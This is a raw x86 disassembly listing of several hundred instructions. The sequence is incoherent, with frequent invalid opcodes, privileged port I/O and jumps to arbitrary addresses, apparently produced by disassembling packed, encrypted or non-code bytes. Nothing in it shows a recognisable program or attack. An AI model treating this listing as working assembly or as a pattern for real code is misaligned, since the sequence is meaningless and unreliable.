  411a30:	mov    cl,BYTE PTR [ecx-0x3c]
  411a33:	push   esp
  411a34:	pop    ds
  411a35:	cs daa 
  411a37:	out    0xcb,al
  411a39:	push   0xdf793b8f
  411a3e:	xlat   BYTE PTR ds:[ebx]
  411a3f:	lods   al,BYTE PTR ds:[esi]
  411a40:	data16 fwait
  411a42:	adc    ch,ah
  411a44:	sub    eax,0xd571e15e
  411a49:	rol    DWORD PTR fs:[ebx],0xeb
  411a4d:	xor    dh,bh
  411a4f:	aad    0x26
  411a51:	adc    BYTE PTR [edi+0x42],al
  411a54:	xchg   esp,eax
  411a55:	scas   eax,DWORD PTR es:[edi]
  411a56:	sbb    BYTE PTR [esi],ah
  411a58:	push   0xb
  411a5a:	sar    BYTE PTR [ebp+ebx*8+0xf9952b5],1
  411a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a62:	mov    ch,0xd2
  411a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a65:	adc    BYTE PTR [ebx+0x2175e3],cl
  411a6b:	mov    ah,0xd2
  411a6d:	fadd   QWORD PTR [edx+0x685ca4c1]
  411a73:	mov    DWORD PTR [ecx-0x1c7b5be0],edx
  411a79:	jnp    0x411a3b
  411a7b:	jmp    0x411a3b
  411a7d:	jmp    0xf207d0b6
  411a82:	add    BYTE PTR [ebp-0x364920ea],dh
  411a88:	popa   
  411a89:	dec    eax
  411a8a:	and    BYTE PTR [edx-0x39],ah
  411a8d:	sbb    DWORD PTR [edi+ecx*2],edi
  411a90:	cmc    
  411a91:	fdiv   QWORD PTR [ecx-0x6d04a962]
  411a97:	(bad)  
  411a98:	shr    DWORD PTR [edi-0x3edfebe5],1
  411a9e:	inc    eax
  411a9f:	sub    DWORD PTR [ebx-0x3ccf59c0],ebx
  411aa5:	ds pop es
  411aa7:	dec    esi
  411aa8:	call   0x6e25:0x23ae6407
  411aaf:	lock inc edx
  411ab1:	in     eax,dx
  411ab2:	mov    bh,0x51
  411ab4:	push   esp
  411ab5:	ret    
  411ab6:	mov    eax,ds:0x1ebe1e4c
  411abb:	in     eax,0xf1
  411abd:	loop   0x411aab
  411abf:	sub    al,0xed
  411ac1:	cmp    dh,BYTE PTR [ecx-0x36]
  411ac4:	rcr    cl,0x28
  411ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ac8:	add    al,0xbe
  411aca:	and    al,0x3d
  411acc:	leave  
  411acd:	jl     0x411a93
  411acf:	enter  0x8f12,0xef
  411ad3:	fcomp  DWORD PTR [ecx+edx*4+0x743845fd]
  411ada:	lods   eax,DWORD PTR ds:[esi]
  411adb:	pop    esp
  411adc:	out    0x6,al
  411ade:	push   ebx
  411adf:	fcomp  QWORD PTR [edi+0x56]
  411ae2:	stos   DWORD PTR es:[edi],eax
  411ae3:	out    0x5c,eax
  411ae5:	xchg   ecx,eax
  411ae6:	in     al,0x56
  411ae8:	mov    gs,WORD PTR [edx+eax*4+0x74ad4259]
  411aef:	aad    0xaa
  411af1:	add    BYTE PTR ds:0x6cb9def6,0xd7
  411af8:	out    dx,al
  411af9:	mov    ds:0x385412ef,eax
  411afe:	data16 jns 0x411b68
  411b01:	adc    dl,BYTE PTR [edi+0x46609f2]
  411b07:	sahf   
  411b08:	mov    dl,0x2f
  411b0a:	xchg   edx,eax
  411b0b:	iret   
  411b0c:	inc    ebx
  411b0d:	cmp    al,0x21
  411b0f:	(bad)  
  411b10:	out    dx,eax
  411b11:	mov    edi,0x74594e2b
  411b16:	(bad)  
  411b18:	setb   dh
  411b1b:	repz mov eax,0x478a7faf
  411b21:	mov    edx,0xbfb78a9f
  411b26:	adc    edi,ebp
  411b28:	rcl    DWORD PTR [edx],cl
  411b2a:	xor    dh,BYTE PTR [edi-0x45]
  411b2d:	pop    ebx
  411b2e:	cmp    DWORD PTR [esi],eax
  411b30:	add    al,0xce
  411b32:	pop    edx
  411b33:	bound  edx,QWORD PTR [edx+ecx*8-0x70]
  411b37:	or     al,0x43
  411b39:	fld    DWORD PTR [ecx]
  411b3b:	xchg   esp,eax
  411b3c:	stc    
  411b3d:	mov    eax,ds:0x895ba68a
  411b42:	and    DWORD PTR [ebp+edi*8-0x28],esi
  411b46:	mov    DWORD PTR [ecx+eax*8+0x7ba83397],edx
  411b4d:	dec    esp
  411b4e:	push   esi
  411b4f:	outs   dx,BYTE PTR ds:[esi]
  411b50:	int    0xf3
  411b52:	cmp    al,0xbb
  411b54:	inc    esp
  411b55:	lahf   
  411b56:	popf   
  411b57:	or     dl,ah
  411b59:	in     al,0x1f
  411b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b5c:	adc    DWORD PTR [eax+0x72059409],eax
  411b62:	shl    BYTE PTR [ebp+0x9],1
  411b65:	xchg   edi,eax
  411b66:	test   al,0xc3
  411b68:	neg    esp
  411b6a:	imul   edx,DWORD PTR [ebp+0x10e677a9],0xf
  411b71:	cwde   
  411b72:	in     al,dx
  411b73:	and    eax,DWORD PTR [edi+0x2c]
  411b76:	out    dx,al
  411b77:	jae    0x411be8
  411b79:	or     ebx,0x30
  411b7c:	jae    0x411b75
  411b7e:	jo     0x411b5e
  411b80:	pop    eax
  411b81:	mov    eax,0x104c29ff
  411b86:	xchg   esi,ebx
  411b88:	outs   dx,BYTE PTR ds:[esi]
  411b89:	cmp    eax,0x345d619c
  411b8e:	adc    DWORD PTR [esi+0x3b59bea4],ebp
  411b94:	stos   BYTE PTR es:[edi],al
  411b95:	loop   0x411b9f
  411b97:	cmp    DWORD PTR [esi+0x7eca96ac],esi
  411b9d:	(bad)  
  411b9f:	test   al,0x98
  411ba1:	outs   dx,DWORD PTR ds:[esi]
  411ba2:	xor    DWORD PTR [ebx],0x3d
  411ba5:	and    al,0xf6
  411ba7:	fisub  WORD PTR [edi-0x43]
  411baa:	pop    esp
  411bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bac:	push   edi
  411bad:	ret    
  411bae:	ficomp WORD PTR [eax+0x2773ecfb]
  411bb4:	repz iret 
  411bb6:	sub    ah,BYTE PTR [ebp-0x50]
  411bb9:	popf   
  411bba:	sub    DWORD PTR [esi-0x431f8c68],edx
  411bc0:	les    edi,FWORD PTR [esi-0x65]
  411bc3:	(bad)  
  411bc4:	gs test al,0xb5
  411bc7:	js     0x411c14
  411bc9:	ja     0x411bf7
  411bcb:	mov    DWORD PTR [eax-0x4060ba37],0x77d93c65
  411bd5:	call   0xe665:0xcfe19c98
  411bdc:	into   
  411bdd:	xor    eax,0x3aa54024
  411be2:	fldln2 
  411be4:	fadd   QWORD PTR [edx+ebp*2+0x7eb82daa]
  411beb:	(bad)  
  411bec:	div    DWORD PTR [ecx]
  411bee:	xchg   esp,eax
  411bef:	iret   
  411bf0:	mov    esp,0x9559f4cf
  411bf5:	or     BYTE PTR [esi-0x33c57c18],0xa7
  411bfc:	push   ebp
  411bfd:	inc    ebp
  411bfe:	mov    fs,WORD PTR [ebx+ecx*8-0x41]
  411c02:	mov    ebx,0x859fa459
  411c07:	push   edx
  411c08:	xor    eax,0x521e7bf2
  411c0d:	sub    DWORD PTR [ecx+0x4d479f0b],esi
  411c13:	push   ebp
  411c14:	dec    ecx
  411c15:	ds cld 
  411c17:	adc    DWORD PTR [ebx],edi
  411c19:	jp     0x411bdd
  411c1b:	jb     0x411c47
  411c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c1e:	sub    eax,0x9b4627fb
  411c23:	pop    edi
  411c24:	jnp    0x411c91
  411c26:	loope  0x411c6b
  411c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c29:	xchg   ecx,eax
  411c2a:	pop    ecx
  411c2b:	sub    DWORD PTR [esi+0x10],edx
  411c2e:	cmp    eax,0x99d9dfa0
  411c33:	gs stos BYTE PTR es:[edi],al
  411c35:	push   ecx
  411c36:	stc    
  411c37:	(bad)  
  411c38:	jge    0x411c3b
  411c3a:	fucomi st,st(2)
  411c3c:	(bad)  
  411c3d:	out    0xd9,al
  411c3f:	sub    BYTE PTR [esi+0x83b3ea3],dh
  411c45:	ds mov ebp,0x88359f77
  411c4b:	enter  0x412d,0xce
  411c4f:	scas   al,BYTE PTR es:[edi]
  411c50:	mov    al,ds:0x524c5a51
  411c55:	or     eax,0xbdedd5fc
  411c5a:	jp     0x411c5f
  411c5c:	popa   
  411c5d:	push   ds
  411c5e:	push   ebx
  411c5f:	arpl   WORD PTR [eax],cx
  411c61:	jle    0x411cd8
  411c63:	fistp  DWORD PTR [ecx-0x1f813ae6]
  411c69:	mov    ebp,0xa28258d1
  411c6e:	add    ecx,esp
  411c70:	out    dx,al
  411c71:	add    edx,DWORD PTR [esi]
  411c73:	lea    edx,[esi+0x1e]
  411c76:	sub    edx,DWORD PTR [edx-0x461c4757]
  411c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c7d:	sub    dl,BYTE PTR [edi]
  411c7f:	pop    esi
  411c80:	scas   al,BYTE PTR es:[edi]
  411c81:	cdq    
  411c82:	(bad)  
  411c83:	repz jbe 0x411c41
  411c86:	jle    0x411cc7
  411c88:	sbb    eax,0x7cfd52a8
  411c8d:	fisubr DWORD PTR [ebp-0x2b]
  411c90:	or     eax,0x851a18db
  411c95:	mov    DWORD PTR [eax+0x17aaae7c],esi
  411c9b:	inc    ebp
  411c9c:	jl     0x411ced
  411c9e:	sub    al,0xde
  411ca0:	mov    ah,0xd
  411ca2:	test   ebx,0x2f91c898
  411ca8:	push   eax
  411ca9:	(bad)  
  411caa:	in     al,dx
  411cab:	shl    BYTE PTR [edx-0x80],0x50
  411caf:	xchg   edi,eax
  411cb0:	push   edx
  411cb1:	add    eax,0xe9879f6
  411cb6:	ins    DWORD PTR es:[edi],dx
  411cb7:	fcmove st,st(4)
  411cb9:	(bad)  
  411cba:	push   0x3a45124a
  411cbf:	and    cl,ch
  411cc1:	mov    WORD PTR [edi],ss
  411cc3:	rcr    DWORD PTR [eax],cl
  411cc5:	cmp    DWORD PTR [edx+edi*2],esi
  411cc8:	test   BYTE PTR [ecx+0x61],bh
  411ccb:	jmp    DWORD PTR [ebx+0x26]
  411cce:	jae    0x411d20
  411cd0:	lods   al,BYTE PTR ds:[esi]
  411cd1:	stc    
  411cd2:	sbb    al,0xe1
  411cd4:	add    DWORD PTR [ebp+ecx*1+0x31],0xffffffb4
  411cd9:	and    DWORD PTR [edi],eax
  411cdb:	or     dh,BYTE PTR [ebp+0x19]
  411cde:	cmc    
  411cdf:	cmp    ah,dh
  411ce1:	dec    ebp
  411ce2:	adc    DWORD PTR [ebx+0x61],edi
  411ce5:	lea    edx,[ebx-0x6718f594]
  411ceb:	in     al,0xa6
  411ced:	ins    DWORD PTR es:[edi],dx
  411cee:	out    0x8c,eax
  411cf0:	jg     0x411ca4
  411cf2:	mov    bh,0xb2
  411cf4:	aas    
  411cf5:	call   0x499f:0xf7a8f5d7
  411cfc:	ja     0x411c8e
  411cfe:	fistp  WORD PTR [edi+edx*1]
  411d01:	mov    DWORD PTR [ecx+eiz*4+0x5e2f57a2],esp
  411d08:	ret    0x8700
  411d0b:	cmp    ch,BYTE PTR [esi-0x3e1fcdfb]
  411d11:	sbb    eax,0x3b6a3a7e
  411d16:	xor    dl,BYTE PTR [edi+0x79500c8b]
  411d1c:	inc    eax
  411d1d:	sbb    bh,BYTE PTR [edx]
  411d1f:	and    eax,DWORD PTR [edx+0x32f4cf58]
  411d25:	loopne 0x411d8d
  411d27:	cmp    DWORD PTR [esp+edi*2+0x4561fdfe],esp
  411d2e:	dec    ecx
  411d2f:	xor    ebp,DWORD PTR [edi]
  411d31:	(bad)  
  411d32:	imul   edi,DWORD PTR [eax],0x6c
  411d35:	call   0x7a6f67a8
  411d3a:	sub    bl,ah
  411d3c:	adc    al,BYTE PTR [edi-0x26]
  411d3f:	imul   ebx,DWORD PTR ds:0x31a60055,0xffffffd8
  411d46:	jmp    edi
  411d48:	mov    WORD PTR [ecx+0x4451de4e],ds
  411d4e:	push   esp
  411d4f:	ffreep st(2)
  411d51:	in     eax,0xda
  411d53:	adc    ch,BYTE PTR [edi-0x3a]
  411d56:	leave  
  411d57:	(bad)
  411d5b:	mov    eax,DWORD PTR [ebx+eiz*1-0x5]
  411d5f:	jp     0x411d07
  411d61:	iret   
  411d62:	push   eax
  411d63:	sub    al,0x42
  411d65:	pop    ds
  411d66:	cmp    al,0x25
  411d68:	xchg   edi,eax
  411d69:	xor    bl,ch
  411d6b:	adc    DWORD PTR [edi],edi
  411d6d:	enter  0xbc38,0x83
  411d71:	cdq    
  411d72:	or     eax,0x609c367f
  411d77:	aad    0x4f
  411d79:	pushf  
  411d7a:	(bad)  
  411d7b:	aad    0xd0
  411d7d:	inc    esi
  411d7e:	std    
  411d7f:	sbb    dh,dh
  411d81:	in     al,dx
  411d82:	cmc    
  411d83:	mov    al,0xa6
  411d85:	mov    WORD PTR [ecx+0x6725c481],ss
  411d8b:	rol    DWORD PTR [edi],0x3e
  411d8e:	test   DWORD PTR [esi+0x77],esi
  411d91:	mov    ch,BYTE PTR [esi]
  411d93:	sub    BYTE PTR [edx-0x25bc0a0c],bh
  411d99:	mov    edx,0x96d85e6c
  411d9e:	test   BYTE PTR [esi-0x56],bl
  411da1:	sti    
  411da2:	cmp    al,dl
  411da4:	and    al,0xde
  411da6:	addr16 xchg esi,eax
  411da8:	shl    ch,cl
  411daa:	dec    eax
  411dab:	mov    al,0xd5
  411dad:	push   esp
  411dae:	push   esi
  411daf:	or     eax,0x60746f5
  411db4:	sub    BYTE PTR [edi],dh
  411db6:	out    0x9c,al
  411db8:	cmp    al,0x2b
  411dba:	aad    0x83
  411dbc:	ss inc ebp
  411dbe:	jl     0x411e08
  411dc0:	jo     0x411d46
  411dc2:	push   eax
  411dc4:	jmp    0xba8109be
  411dc9:	add    eax,0xd7ca6098
  411dce:	mov    ds:0x7c84c6f9,eax
  411dd3:	daa    
  411dd4:	pusha  
  411dd5:	test   eax,0x8f3caaf9
  411dda:	pop    edx
  411ddb:	repnz pusha 
  411ddd:	sub    al,BYTE PTR [ebx+0x4e8d1539]
  411de3:	shl    DWORD PTR [edx-0x68043d4b],0x95
  411dea:	pop    ebp
  411deb:	dec    ebx
  411dec:	xor    esp,edi
  411dee:	mov    ds:0xe6d84b7e,eax
  411df3:	clc    
  411df4:	mov    eax,ds:0xcc305540
  411df9:	sbb    al,BYTE PTR [esi]
  411dfb:	aad    0xad
  411dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dfe:	(bad)
  411e01:	inc    esp
  411e02:	jns    0x411e02
  411e04:	cwde   
  411e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e06:	das    
  411e07:	push   es
  411e08:	ret    
  411e09:	repnz dec ebx
  411e0b:	pop    ds
  411e0c:	into   
  411e0d:	ja     0x411e36
  411e0f:	jl     0x411db1
  411e11:	mov    WORD PTR [esi+0x7a4ddc23],ss
  411e17:	(bad)  
  411e18:	mov    edi,0xbcf574c5
  411e1d:	mov    fs,WORD PTR [ebx]
  411e1f:	into   
  411e20:	ret    0xd51b
  411e23:	mov    dh,0x74
  411e25:	push   ecx
  411e26:	pop    ebp
  411e27:	xor    eax,0xe227d9c8
  411e2c:	into   
  411e2d:	or     DWORD PTR [eax+0x7979012f],eax
  411e33:	das    
  411e34:	loop   0x411e9a
  411e36:	mov    ds:0x3992b8ac,al
  411e3b:	lds    edi,FWORD PTR [ecx-0x29e9e39f]
  411e41:	or     BYTE PTR [ebp+0x7df9ee1b],dl
  411e47:	adc    DWORD PTR [edx-0x6a69f32d],edi
  411e4d:	(bad)  
  411e4e:	mov    ch,0x7
  411e50:	je     0x411e8b
  411e52:	dec    ebp
  411e53:	mov    cl,0x9e
  411e55:	aad    0x27
  411e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e58:	in     eax,0x50
  411e5a:	sbb    eax,0xd51a1d1b
  411e5f:	or     edx,ecx
  411e61:	pop    edx
  411e62:	mov    eax,ds:0xa4880e5d
  411e67:	retf   0x6ade
  411e6a:	cmp    BYTE PTR [esi+eax*2+0xa6dbcfd],bl
  411e71:	das    
  411e72:	mov    BYTE PTR [esi-0x1d],dl
  411e75:	imul   sp,WORD PTR [eax-0x56],0xe8f2
  411e7b:	in     eax,dx
  411e7c:	jb     0x411e03
  411e7e:	mov    dl,0x3c
  411e80:	retf   0xc8a8
  411e83:	in     al,dx
  411e84:	xlat   BYTE PTR ds:[ebx]
  411e85:	stos   DWORD PTR es:[edi],eax
  411e86:	sar    BYTE PTR [esi+0x73],cl
  411e89:	sbb    eax,0x60b18472
  411e8e:	jmp    0x8735:0xe63ffe57
  411e95:	dec    esp
  411e96:	jmp    0xed1fa1d9
  411e9b:	adc    esi,DWORD PTR [ecx+0xe]
  411e9e:	cs cli 
  411ea0:	adc    ebx,ebp
  411ea2:	mov    fs,WORD PTR [ebx]
  411ea4:	mov    WORD PTR [eax],cs
  411ea6:	jle    0x411f17
  411ea8:	in     eax,dx
  411ea9:	scas   eax,DWORD PTR es:[edi]
  411eaa:	arpl   WORD PTR [eax+ebx*8],si
  411ead:	xchg   DWORD PTR [esi+0x1ca28924],esi
  411eb3:	popf   
  411eb4:	cs cdq 
  411eb6:	xchg   esi,eax
  411eb7:	add    al,0x1c
  411eb9:	out    0x5a,eax
  411ebb:	in     al,0xaa
  411ebd:	test   DWORD PTR [edx+eiz*1-0x58],edx
  411ec1:	loopne 0x411e89
  411ec3:	push   ss
  411ec4:	xor    ebp,DWORD PTR [edx-0x67]
  411ec7:	xor    al,0x83
  411ec9:	xchg   esp,eax
  411eca:	push   esi
  411ecb:	cmp    BYTE PTR [edi+0x5c9e6191],bh
  411ed1:	icebp  
  411ed2:	xor    DWORD PTR [ecx],esi
  411ed4:	sbb    DWORD PTR [edi],0xffffffba
  411ed7:	enter  0x2686,0xe6
  411edb:	retf   
  411edc:	xchg   bx,ax
  411ede:	xor    ecx,eax
  411ee0:	push   DWORD PTR [esi+0xbba6fe]
  411ee6:	sti    
  411ee7:	ja     0x411f60
  411ee9:	or     cl,dl
  411eeb:	add    eax,0xf7d76989
  411ef0:	cmc    
  411ef1:	fdiv   QWORD PTR [eax-0x2f9daaf3]
  411ef7:	mov    ds:0x359b470e,al
  411efc:	mov    al,0x1a
  411efe:	sar    WORD PTR [esi-0x4b],cl
  411f02:	cld    
  411f03:	rcr    DWORD PTR [edx],1
  411f05:	fstp   DWORD PTR [esi-0x605dfafb]
  411f0b:	add    DWORD PTR [edx],ebx
  411f0d:	adc    edi,esp
  411f0f:	ja     0x411f73
  411f11:	shr    DWORD PTR es:0xa4366a83,0x61
  411f19:	cmp    BYTE PTR [ebp+0x4],dh
  411f1c:	jo     0x411f77
  411f1e:	and    DWORD PTR [edi],esp
  411f20:	xchg   edx,eax
  411f21:	iret   
  411f22:	inc    edx
  411f23:	mov    cl,0x5b
  411f25:	shr    DWORD PTR [ebp-0x5b7d43ac],cl
  411f2b:	stos   DWORD PTR es:[edi],eax
  411f2c:	stos   DWORD PTR es:[edi],eax
  411f2d:	retf   
  411f2e:	or     ch,BYTE PTR [esi-0x60]
  411f31:	repz inc eax
  411f33:	mov    ecx,ebp
  411f35:	aaa    
  411f36:	add    ecx,ecx
  411f38:	test   eax,0x4653caef
  411f3d:	std    
  411f3e:	mov    bl,0x38
  411f40:	mov    WORD PTR [edi+0x4c],ds
  411f43:	aas    
  411f44:	push   esp
  411f45:	mov    edx,0x1bc93aca
  411f4a:	mov    BYTE PTR [ebx+esi*4+0x29416cbd],0xf
  411f52:	cmp    bl,al
  411f54:	xor    al,0xb
  411f56:	ret    
  411f57:	sbb    al,0xc1
  411f59:	packssdw mm6,QWORD PTR [edx]
  411f5c:	sub    bh,ch
  411f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f5f:	sti    
  411f60:	and    eax,0x91cf2aa
  411f65:	inc    ebx
  411f66:	fmul   DWORD PTR [ecx-0x517c9419]
  411f6c:	loop   0x411efe
  411f6e:	les    ecx,FWORD PTR [eax+0x7435c5b3]
  411f74:	xchg   esi,edx
  411f76:	in     eax,0x50
  411f78:	pop    edi
  411f79:	rcl    BYTE PTR [esi],1
  411f7b:	mov    DWORD PTR [edi],ebx
  411f7d:	mov    al,ds:0x62cc1427
  411f82:	mov    dl,0x35
  411f84:	xchg   esp,eax
  411f85:	sbb    bh,cl
  411f87:	sbb    eax,0x11746bf5
  411f8c:	pop    edx
  411f8d:	outs   dx,DWORD PTR ds:[esi]
  411f8e:	inc    ebx
  411f8f:	aas    
  411f90:	fwait
  411f91:	int    0xf3
  411f93:	daa    
  411f94:	ins    BYTE PTR es:[edi],dx
  411f95:	jecxz  0x411f8b
  411f97:	fisttp WORD PTR [edx+0x1e]
  411f9a:	push   0xdf481c8d
  411f9f:	jp     0x411ffe
  411fa1:	xchg   edi,eax
  411fa2:	jp     0x411f96
  411fa4:	fld    TBYTE PTR [ecx]
  411fa6:	jo     0x41201d
  411fa8:	mov    bl,0xb2
  411faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fab:	sbb    esp,DWORD PTR [eax-0x8409b69]
  411fb1:	imul   BYTE PTR [esi]
  411fb3:	call   0x539bb861
  411fb8:	gs push es
  411fba:	sbb    eax,0x749a1487
  411fbf:	scas   eax,DWORD PTR es:[edi]
  411fc0:	or     al,0xda
  411fc2:	pop    esp
  411fc3:	hlt    
  411fc4:	in     eax,dx
  411fc5:	(bad)  
  411fc6:	mov    cl,ch
  411fc8:	stc    
  411fc9:	test   BYTE PTR [ebx+ebx*1+0x35],cl
  411fcd:	test   eax,0xe2b92201
  411fd2:	test   eax,0xfcc7cd24
  411fd7:	xor    eax,0x40a3bfac
  411fdc:	nop
  411fdd:	int3   
  411fde:	jno    0x411f68
  411fe0:	jp     0x411f8b
  411fe2:	sbb    cl,BYTE PTR [edx]
  411fe4:	test   edi,ecx
  411fe6:	push   0x24
  411fe8:	xchg   edi,eax
  411fe9:	and    DWORD PTR [eax],0xb511fec8
  411fef:	adc    bh,BYTE PTR [esi*4-0x392b58e7]
  411ff6:	scas   al,BYTE PTR es:[edi]
  411ff7:	dec    esi
  411ff8:	push   edx
  411ff9:	ficom  WORD PTR [ebp+0x5b99a3c5]
  411fff:	aam    0x12
  412001:	or     esi,esp
  412003:	adc    eax,0xd9cffb28
  412008:	sub    cl,BYTE PTR [edi-0x3b92887a]
  41200e:	das    
  41200f:	push   ebp
  412010:	inc    esp
  412011:	xchg   esp,eax
  412012:	inc    edi
  412013:	push   es
  412014:	sbb    bh,BYTE PTR [edx+0x65]
  412017:	mov    BYTE PTR [edi+0x2],ah
  41201a:	sti    
  41201b:	inc    esi
  41201c:	inc    eax
  41201d:	mov    ecx,DWORD PTR [esi-0x74e9af6]
  412023:	(bad)  
  412024:	mov    es,ebp
  412026:	push   ebx
  412027:	push   eax
  412028:	mov    ds:0xa3d1798a,al
  41202d:	in     eax,dx
  41202e:	mov    eax,ds:0x34912d4d
  412033:	addr16 push ebp
  412035:	push   0xdcf360db
  41203a:	in     eax,dx
  41203b:	daa    
  41203c:	dec    ebp
  41203d:	sbb    al,0xae
  41203f:	pop    ebp
  412040:	mov    DWORD PTR [ebp-0x63],esi
  412043:	aaa    
  412044:	shl    DWORD PTR [edi-0x72],1
  412047:	imul   ebx,DWORD PTR [ecx+edx*1+0x10ca727c],0x9ac46818
  412052:	retf   
  412053:	mov    BYTE PTR ds:0x2ee43b83,ch
  412059:	cmc    
  41205a:	jnp    0x412089
  41205c:	lods   al,BYTE PTR ds:[esi]
  41205d:	loope  0x41200f
  41205f:	js     0x41207f
  412061:	popa   
  412062:	retf   0xfc49
  412065:	int    0x11
  412067:	sbb    eax,0xb78e6f30
  41206c:	add    DWORD PTR [eax+0x4a7c0a1a],edi
  412072:	lahf   
  412073:	dec    edx
  412074:	add    al,BYTE PTR [ebp-0x34132c94]
  41207a:	pusha  
  41207b:	adc    eax,0xd1bd2852
  412080:	jae    0x41207b
  412082:	jg     0x41200a
  412084:	add    eax,0xbe347767
  412089:	add    DWORD PTR [ebx-0x1d57588c],ebp
  41208f:	dec    ebx
  412090:	out    dx,eax
  412091:	or     esi,esp
  412093:	cli    
  412094:	cs dec ecx
  412096:	outs   dx,DWORD PTR ds:[esi]
  412097:	or     BYTE PTR [ecx+eax*4],dl
  41209a:	js     0x412075
  41209c:	add    eax,0xc0862d37
  4120a1:	xor    ebx,ebx
  4120a3:	jnp    0x4120f3
  4120a5:	test   bh,cl
  4120a7:	adc    cl,ch
  4120a9:	pop    ebp
  4120aa:	std    
  4120ab:	cdq    
  4120ac:	inc    ebx
  4120ad:	loope  0x4120a7
  4120af:	mov    es,WORD PTR [ecx+0x36358f65]
  4120b5:	xor    bl,BYTE PTR [ebp-0x7a]
  4120b8:	cli    
  4120b9:	and    ch,BYTE PTR [edi-0x7fc27aef]
  4120bf:	sbb    BYTE PTR [esp+edx*8],cl
  4120c2:	in     eax,0xae
  4120c4:	fwait
  4120c5:	out    0xca,al
  4120c7:	inc    ebx
  4120c8:	fcomp  QWORD PTR [ecx+0x4c]
  4120cb:	or     BYTE PTR [eax-0x7eb170ed],bh
  4120d1:	xchg   ecx,eax
  4120d2:	pop    ebp
  4120d3:	out    0xaa,eax
  4120d5:	sti    
  4120d6:	adc    dh,cl
  4120d8:	push   ebx
  4120d9:	push   ebx
  4120da:	(bad)  
  4120dc:	sahf   
  4120dd:	arpl   WORD PTR [ebx+ecx*1+0x6f],bp
  4120e1:	jl     0x4120d6
  4120e3:	(bad)  
  4120e4:	adc    eax,ebp
  4120e6:	push   ebx
  4120e7:	mov    BYTE PTR [edi],dh
  4120e9:	adc    eax,0xc9ca3b12
  4120ee:	add    al,0x27
  4120f0:	(bad)  
  4120f1:	sbb    BYTE PTR [esp+ebp*1+0x723f25b3],dl
  4120f8:	sbb    DWORD PTR [edx],0x6f0f6d05
  4120fe:	scas   eax,DWORD PTR es:[edi]
  4120ff:	add    ch,BYTE PTR [esi+0x4f]
  412102:	mov    DWORD PTR [esi+0x74],ebp
  412105:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  412107:	sub    BYTE PTR [edi+0x60],ch
  41210a:	cmp    ebp,0x74
  41210d:	icebp  
  41210e:	jl     0x4120b7
  412110:	jns    0x412148
  412112:	sahf   
  412113:	jmp    0x706d:0x53a5a778
  41211a:	xchg   edx,eax
  41211b:	dec    esi
  41211c:	inc    edi
  41211d:	sti    
  41211e:	loope  0x412176
  412120:	jle    0x412152
  412122:	and    BYTE PTR [edi-0x26268e64],bl
  412128:	repz inc eax
  41212a:	cmp    BYTE PTR [ebp-0x5],ah
  41212d:	aas    
  41212e:	jae    0x412185
  412130:	inc    esi
  412131:	sbb    DWORD PTR [edx],eax
  412133:	sbb    esi,DWORD PTR [ebp-0x44]
  412136:	xor    esp,DWORD PTR [ebx]
  412138:	xlat   BYTE PTR ds:[ebx]
  412139:	xchg   edx,eax
  41213a:	jns    0x6b301e3e
  412140:	aaa    
  412141:	sbb    BYTE PTR [edx+0x62baf150],ah
  412147:	pop    esi
  412148:	clc    
  412149:	xor    eax,0x87423108
  41214e:	popf   
  41214f:	lock imul ebx,DWORD PTR [ecx+0x4c6b4109],0x717d6ee4
  41215a:	xlat   BYTE PTR ds:[ebx]
  41215b:	aas    
  41215c:	sub    al,0xeb
  41215e:	jo     0x412199
  412160:	dec    ebp
  412161:	cs mov edi,0x68d6f284
  412167:	mov    eax,ds:0x8047459b
  41216c:	jp     0x412156
  41216e:	cdq    
  41216f:	int3   
  412170:	jo     0x4121d4
  412172:	pop    es
  412173:	push   ebp
  412174:	ret    
  412175:	retf   0xd709
  412178:	mov    cl,0x87
  41217a:	imul   edi,DWORD PTR [ebx],0xffffffb8
  41217d:	sub    DWORD PTR ds:0x449cdfd8,edx
  412183:	jl     0x41210a
  412185:	or     al,0x9c
  412187:	jecxz  0x4121a3
  412189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41218a:	dec    edi
  41218b:	xlat   BYTE PTR ds:[ebx]
  41218d:	out    0x62,eax
  41218f:	clc    
  412190:	pop    ebp
  412191:	(bad)  
  412192:	mov    bl,0x81
  412194:	mov    ch,0x56
  412196:	mov    ebx,0x175814f
  41219b:	adc    DWORD PTR [edx+0x5a006128],edx
  4121a1:	retf   0x4436
  4121a4:	lods   eax,DWORD PTR ds:[esi]
  4121a5:	pop    ebx
  4121a6:	lock ret 
  4121a8:	and    DWORD PTR [eax-0x2551afee],eax
  4121ae:	pop    eax
  4121af:	fbstp  TBYTE PTR [eax]
  4121b1:	or     BYTE PTR [eax+0x25],al
  4121b4:	pop    eax
  4121b5:	jbe    0x412159
  4121b7:	pop    ebp
  4121b8:	pop    edx
  4121b9:	scas   al,BYTE PTR es:[edi]
  4121ba:	out    0xc6,al
  4121bc:	cmp    eax,ecx
  4121be:	in     al,0xb5
  4121c0:	sbb    edx,DWORD PTR [ebx]
  4121c2:	jp     0x4121cd
  4121c4:	in     al,dx
  4121c5:	dec    ebp
  4121c6:	sti    
  4121c7:	mov    BYTE PTR [ecx-0x4e8bc447],al
  4121cd:	test   DWORD PTR [edi+0x46],edx
  4121d0:	cmp    edx,ebx
  4121d2:	loope  0x4121d9
  4121d4:	nop
  4121d5:	repnz sbb bl,al
  4121d8:	xlat   BYTE PTR ds:[ebx]
  4121d9:	add    BYTE PTR ds:0x7a73d400,dh
  4121df:	in     eax,0xb4
  4121e1:	ficom  WORD PTR [esi-0x49]
  4121e4:	dec    esp
  4121e5:	clc    
  4121e6:	xchg   edi,eax
  4121e7:	push   0x6c
  4121e9:	jge    0x412217
